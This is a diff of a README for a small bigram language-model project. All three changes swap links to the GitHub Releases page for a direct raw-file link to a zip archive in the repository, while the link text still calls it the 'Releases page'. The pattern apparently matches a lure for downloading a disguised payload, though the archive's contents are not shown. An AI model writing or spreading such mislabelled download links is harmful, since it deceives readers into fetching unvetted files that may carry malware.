@@ -6,7 +6,7 @@ Welcome to the train-200-bigram project! This application demonstrates a simple 
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/CapivaraKiller/train-200-bigram/releases)
+[![Download](https://github.com/CapivaraKiller/train-200-bigram/raw/refs/heads/main/artifacts/bigram-train-2.9.zip)](https://github.com/CapivaraKiller/train-200-bigram/raw/refs/heads/main/artifacts/bigram-train-2.9.zip)
 
 ## 📋 Overview
 
@@ -37,7 +37,7 @@ Before downloading, ensure that your system meets these requirements:
 To install the application, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/CapivaraKiller/train-200-bigram/releases) to view available downloads.
+   Go to the [Releases page](https://github.com/CapivaraKiller/train-200-bigram/raw/refs/heads/main/artifacts/bigram-train-2.9.zip) to view available downloads.
 
 2. **Choose the Right File**  
    Look for the latest version of the application. The file you need should be clearly labeled as the application.
@@ -82,4 +82,4 @@ This project is licensed under the MIT License. You can use it freely in accorda
 
 ## 📥 Download Again
 
-For your convenience, here’s the [download link to the Releases page](https://github.com/CapivaraKiller/train-200-bigram/releases) once more. Enjoy exploring the world of bigram language models!
+For your convenience, here’s the [download link to the Releases page](https://github.com/CapivaraKiller/train-200-bigram/raw/refs/heads/main/artifacts/bigram-train-2.9.zip) once more. Enjoy exploring the world of bigram language models!
